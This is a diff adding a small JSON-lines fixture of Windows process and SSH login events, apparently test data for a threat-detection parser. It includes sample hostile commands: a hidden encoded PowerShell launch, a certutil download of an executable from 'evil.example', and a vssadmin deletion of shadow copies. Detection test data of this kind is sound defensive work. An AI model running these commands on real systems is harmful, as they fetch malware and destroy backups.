@@ -1,0 +1,8 @@
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA", "ParentImage": "C:\\Windows\\explorer.exe", "User": "CORP\\alice"}
+{"Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe notes.txt", "User": "CORP\\alice"}
+{"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\winword.exe", "CommandLine": "cmd /c whoami", "User": "CORP\\bob"}
+{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://evil.example/a.exe a.exe", "User": "CORP\\bob"}
+{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet", "User": "CORP\\bob"}
+{"event": "ssh_login_success", "user": "root", "src_ip": "203.0.113.50"}
+{"event": "ssh_login_success", "user": "root", "src_ip": "10.1.2.3"}
+not json at all
